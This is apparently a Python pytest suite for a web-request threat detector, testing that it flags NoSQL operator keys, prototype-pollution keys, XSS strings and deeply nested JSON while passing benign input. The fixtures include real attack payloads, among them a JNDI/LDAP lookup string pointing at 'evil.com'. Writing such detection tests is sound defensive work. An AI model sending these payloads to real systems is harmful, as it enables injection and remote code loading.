import json
import logging
from unittest.mock import patch
from urllib.parse import urlencode

import pytest
from pytest_mock import MockerFixture

from guard_core.models import SecurityConfig
from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
from guard_core.sync.utils import (
    _check_embedded_json,
    _check_request_component,
    _check_value_enhanced,
    _scan_component_name,
    _scan_form_body,
    _scan_headers,
    _scan_json_value,
    _scan_multipart_body,
    _scan_query_params,
    detect_penetration_attempt,
)
from tests.test_sync.conftest import SyncMockGuardRequest

_CONFIG = SecurityConfig()


@pytest.fixture(autouse=True)
def _force_enhanced_detection_singleton() -> None:
    sus_patterns_handler.configure(SecurityConfig())


def _body_request(payload: bytes, content_type: str) -> SyncMockGuardRequest:
    headers = {"content-length": str(len(payload))}
    if content_type:
        headers["content-type"] = content_type
    return SyncMockGuardRequest(body_content=payload, headers=headers)


def test_query_param_name_nosql_operator_detected() -> None:
    request = SyncMockGuardRequest(query_params={"username[$ne]": "admin"})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["nosql"]


def test_query_param_name_benign_not_detected() -> None:
    request = SyncMockGuardRequest(query_params={"user_id": "1005"})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is False


@pytest.mark.parametrize(
    "name",
    ["price[$gt]", "sort[$in]", "filter[$ne]"],
)
def test_query_param_name_operator_query_twin_fires_nosql(name: str) -> None:
    request = SyncMockGuardRequest(query_params={name: "100"})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["nosql"]


def test_json_body_key_prototype_pollution_detected() -> None:
    body = json.dumps({"__proto__[x]": "1"}).encode()
    request = _body_request(body, "application/json")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["proto_pollution"]


def test_json_body_key_benign_not_detected() -> None:
    body = json.dumps({"user_id": "1005"}).encode()
    request = _body_request(body, "application/json")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is False


def test_form_field_name_nosql_operator_detected() -> None:
    body = urlencode({"username[$ne]": "admin"}).encode()
    request = _body_request(body, "application/x-www-form-urlencoded")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["nosql"]


def test_form_field_name_benign_not_detected() -> None:
    body = urlencode({"user_id": "1005"}).encode()
    request = _body_request(body, "application/x-www-form-urlencoded")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is False


def test_multipart_field_name_prototype_pollution_detected() -> None:
    body = (
        b'--B0\r\nContent-Disposition: form-data; name="__proto__[x]"\r\n\r\n'
        b"1\r\n--B0--\r\n"
    )
    request = _body_request(body, "multipart/form-data; boundary=B0")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["proto_pollution"]


def test_multipart_field_name_benign_not_detected() -> None:
    body = (
        b'--B0\r\nContent-Disposition: form-data; name="user_id"\r\n\r\n'
        b"1005\r\n--B0--\r\n"
    )
    request = _body_request(body, "multipart/form-data; boundary=B0")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is False


def test_embedded_json_key_in_query_value_detected() -> None:
    request = SyncMockGuardRequest(
        query_params={"filters": json.dumps({"__proto__[x]": "1"})}
    )
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert "JSON key" in result.trigger_info


def test_embedded_json_key_in_query_value_benign_not_detected() -> None:
    request = SyncMockGuardRequest(
        query_params={"filters": json.dumps({"user_id": "1005"})}
    )
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is False


def test_header_name_nonexcluded_xss_detected() -> None:
    request = SyncMockGuardRequest(headers={"<svg onload=alert(1)>": "1"})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["xss"]


def test_header_name_nonexcluded_benign_not_detected() -> None:
    request = SyncMockGuardRequest(headers={"X-Request-Id": "abc-123"})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is False


def test_scan_headers_nonexcluded_name_detected() -> None:
    request = SyncMockGuardRequest(headers={"<svg onload=alert(1)>": "1"})
    detected, trigger, threats = _scan_headers(
        request, set(), None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is True
    assert "header name" in trigger.lower()
    assert threats


def test_scan_headers_nonexcluded_value_detected_when_name_clean() -> None:
    request = SyncMockGuardRequest(headers={"X-Test": "<svg onload=alert(1)>"})
    detected, trigger, threats = _scan_headers(
        request, set(), None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is True
    assert trigger.startswith("Header '")
    assert "header name" not in trigger.lower()


def test_scan_headers_nonexcluded_clean_not_detected() -> None:
    request = SyncMockGuardRequest(headers={"X-Test": "hello"})
    detected, trigger, threats = _scan_headers(
        request, set(), None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is False
    assert trigger == ""
    assert threats == []


def test_scan_headers_excluded_name_jndi_detected() -> None:
    marker = "${jndi:ldap://evil.com/a}"
    request = SyncMockGuardRequest(headers={marker: "benign"})
    detected, trigger, threats = _scan_headers(
        request, {marker}, None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is True
    assert "header name" in trigger.lower()
    assert threats[0]["category"] == "cmd_injection"


def test_scan_headers_excluded_value_jndi_detected_when_name_clean() -> None:
    request = SyncMockGuardRequest(headers={"user-agent": "${jndi:ldap://evil.com/a}"})
    detected, trigger, threats = _scan_headers(
        request, {"user-agent"}, None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is True
    assert "header name" not in trigger.lower()
    assert trigger.startswith("Header '")


def test_scan_headers_excluded_clean_name_and_value_not_detected() -> None:
    request = SyncMockGuardRequest(headers={"user-agent": "Mozilla/5.0 normal"})
    detected, trigger, threats = _scan_headers(
        request, {"user-agent"}, None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is False


def test_scan_headers_excluded_skipped_when_cmd_injection_disabled() -> None:
    request = SyncMockGuardRequest(headers={"user-agent": "${jndi:ldap://evil.com/a}"})
    detected, trigger, threats = _scan_headers(
        request, {"user-agent"}, {"xss"}, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is False


def test_scan_component_name_skips_embedded_json_parse(
    mocker: MockerFixture,
) -> None:
    spy = mocker.patch(
        "guard_core.sync._utils.embedded_json_scan._check_embedded_json",
        return_value=None,
    )
    _scan_component_name(
        json.dumps({"a": "1"}),
        "query_param:filters",
        "query param name 'filters'",
        None,
        "127.0.0.1",
        "corr-1",
        "WARNING",
    )
    spy.assert_not_called()


def test_check_request_component_value_scan_still_attempts_embedded_json_parse(
    mocker: MockerFixture,
) -> None:
    spy = mocker.patch(
        "guard_core.sync._utils.embedded_json_scan._check_embedded_json",
        return_value=None,
    )
    _check_request_component(
        json.dumps({"a": "1"}),
        "query_param:filters",
        "query param 'filters'",
        "127.0.0.1",
        "corr-1",
        None,
        "WARNING",
    )
    spy.assert_called_once()


def test_check_value_enhanced_scan_embedded_json_false_skips_json_parse(
    mocker: MockerFixture,
) -> None:
    spy = mocker.patch(
        "guard_core.sync._utils.embedded_json_scan._check_embedded_json",
        return_value=None,
    )
    _check_value_enhanced(
        json.dumps({"a": "1"}),
        "query_param:filters",
        "127.0.0.1",
        "corr-1",
        None,
        scan_embedded_json=False,
    )
    spy.assert_not_called()


def test_check_value_enhanced_scan_embedded_json_true_attempts_json_parse(
    mocker: MockerFixture,
) -> None:
    spy = mocker.patch(
        "guard_core.sync._utils.embedded_json_scan._check_embedded_json",
        return_value=None,
    )
    _check_value_enhanced(
        json.dumps({"a": "1"}),
        "query_param:filters",
        "127.0.0.1",
        "corr-1",
        None,
        scan_embedded_json=True,
    )
    spy.assert_called_once()


def test_scan_component_name_json_shaped_name_still_detects_via_regex() -> None:
    name = json.dumps({"__proto__[x]": "1"})
    detected, trigger, threats = _scan_component_name(
        name,
        "query_param:filters",
        "query param name 'filters'",
        None,
        "127.0.0.1",
        "corr-1",
        "WARNING",
    )
    assert detected is True
    assert threats
    assert threats[0]["category"] == "proto_pollution"


def test_embedded_json_key_threat_categories_are_populated() -> None:
    request = SyncMockGuardRequest(
        query_params={"filters": json.dumps({"__proto__[x]": "1"})}
    )
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.threat_categories == ["proto_pollution"]
    assert result.threat_scores


def test_check_embedded_json_enabled_categories_filters_name_scan() -> None:
    result = _check_embedded_json(
        json.dumps({"__proto__[x]": "1"}),
        "query_param:filters",
        "127.0.0.1",
        "corr-1",
        {"xss"},
        frozenset(),
        frozenset(),
        False,
    )
    assert result is not None
    assert result[0] is False


def test_embedded_json_scan_miss_still_falls_through_to_pattern_scan() -> None:
    detected, trigger, threats, log_override = _check_value_enhanced(
        "<script>alert(1)</script>",
        "query_param:filters",
        "127.0.0.1",
        "corr-1",
        None,
    )
    assert detected is True
    assert threats
    assert log_override is None


def test_check_embedded_json_enabled_categories_none_detects_key() -> None:
    result = _check_embedded_json(
        json.dumps({"__proto__[x]": "1"}),
        "query_param:filters",
        "127.0.0.1",
        "corr-1",
        None,
        frozenset(),
        frozenset(),
        False,
    )
    assert result is not None
    detected, trigger, _threats, log_override = result
    assert detected is True
    assert "JSON key" in trigger
    assert log_override == '{"__proto__[x]":"1"}'


def test_check_value_enhanced_is_threat_empty_threats_reports_generic() -> None:
    def mock_detect(*_a: object, **_kw: object) -> dict[str, object]:
        return {"is_threat": True, "threats": []}

    with patch.object(sus_patterns_handler, "detect", side_effect=mock_detect):
        detected, trigger, threats, log_override = _check_value_enhanced(
            "plain body content",
            "request_body",
            "127.0.0.1",
            "corr-1",
            None,
        )
    assert detected is True
    assert trigger == "Threat detected"
    assert threats == []
    assert log_override is None


def test_check_value_enhanced_recursion_error_from_detect_propagates() -> None:
    def mock_detect(*_a: object, **_kw: object) -> dict[str, object]:
        raise RecursionError("regex recursion budget exceeded")

    with patch.object(sus_patterns_handler, "detect", side_effect=mock_detect):
        with pytest.raises(RecursionError):
            _check_value_enhanced(
                "plain body content",
                "request_body",
                "127.0.0.1",
                "corr-1",
                None,
            )


def test_scan_query_params_excluded_name_skips_name_and_value() -> None:
    request = SyncMockGuardRequest(query_params={"username[$ne]": "admin"})
    detected, trigger, threats = _scan_query_params(
        request, {"username[$ne]"}, None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is False


def test_scan_json_value_excluded_key_skips_name_and_value() -> None:
    detected, trigger, threats = _scan_json_value(
        {"__proto__[x]": "1"},
        "",
        {"__proto__[x]"},
        None,
        "127.0.0.1",
        "corr-1",
        "WARNING",
    )
    assert detected is False


def test_scan_form_body_excluded_name_skips_name_and_value() -> None:
    raw_body = urlencode({"username[$ne]": "admin"})
    detected, trigger, threats = _scan_form_body(
        raw_body, {"username[$ne]"}, None, "127.0.0.1", "corr-1", "WARNING"
    )
    assert detected is False


def test_scan_multipart_body_excluded_name_skips_name_and_value() -> None:
    raw_body = (
        '--B0\r\nContent-Disposition: form-data; name="__proto__[x]"\r\n\r\n'
        "1\r\n--B0--\r\n"
    )
    detected, trigger, threats = _scan_multipart_body(
        raw_body,
        "multipart/form-data; boundary=B0",
        {"__proto__[x]"},
        None,
        "127.0.0.1",
        "corr-1",
        "WARNING",
    )
    assert detected is False


def _nested_json_string(depth: int, leaf: str) -> str:
    return ('{"a":' * depth) + json.dumps(leaf) + ("}" * depth)


_RECURSION_XSS_PAYLOAD = _nested_json_string(1500, "<script>alert(1)</script>")


def test_check_embedded_json_stops_at_the_budget_before_a_late_payload() -> None:
    result = _check_embedded_json(
        _RECURSION_XSS_PAYLOAD,
        "query_param:v",
        "127.0.0.1",
        "corr-1",
        None,
        frozenset(),
        frozenset(),
        False,
    )
    assert result is None


def test_query_param_beyond_json_loads_recursion_limit_does_not_raise() -> None:
    request = SyncMockGuardRequest(query_params={"v": _RECURSION_XSS_PAYLOAD})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.trigger_info.startswith("Query param 'v': ")


def test_header_beyond_json_loads_recursion_limit_does_not_raise() -> None:
    request = SyncMockGuardRequest(headers={"x-custom": _RECURSION_XSS_PAYLOAD})
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.trigger_info.startswith("Header 'x-custom': ")


def test_form_field_beyond_json_loads_recursion_limit_does_not_raise() -> None:
    body = urlencode({"v": _RECURSION_XSS_PAYLOAD}).encode()
    request = _body_request(body, "application/x-www-form-urlencoded")
    result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert result.trigger_info.startswith("Request body field 'v': ")


def test_query_param_beyond_the_parser_limit_does_not_warn_of_the_depth_cap(
    caplog: pytest.LogCaptureFixture,
) -> None:
    request = SyncMockGuardRequest(query_params={"v": _RECURSION_XSS_PAYLOAD})
    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, _CONFIG)
    assert result.is_threat is True
    assert "detection_max_json_depth" not in caplog.text
